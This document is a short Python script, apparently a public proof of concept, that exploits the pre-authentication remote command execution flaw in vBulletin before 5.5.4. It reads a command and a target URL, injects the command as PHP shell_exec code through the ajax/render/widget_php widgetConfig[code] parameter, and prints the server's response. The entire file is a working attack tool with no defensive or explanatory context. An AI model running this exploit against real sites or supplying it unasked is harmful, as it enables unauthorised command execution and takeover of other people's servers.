import requests


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


params = {"routestring": "ajax/render/widget_php"}


def exploit():
    while True:
        try:
            cmd = input(f"{Colors.red}(vBulletin <5.5.4 Pre Authenticated Remote Command Execution){Colors.end} [Enter Command ]:~#")
            params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
            r = requests.post(url=input(f"{Colors.red}(vBulletin <5.x Pre Authenticated Remote Command Execution){Colors.end} [URL To vBulletin]:~#"), data = params)
            if r.status_code == 200:
                print(r.text)
                break
            else:
                exit("Exploit failed! :(")
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            exit(str(e))


if __name__ == '__main__':
    exploit()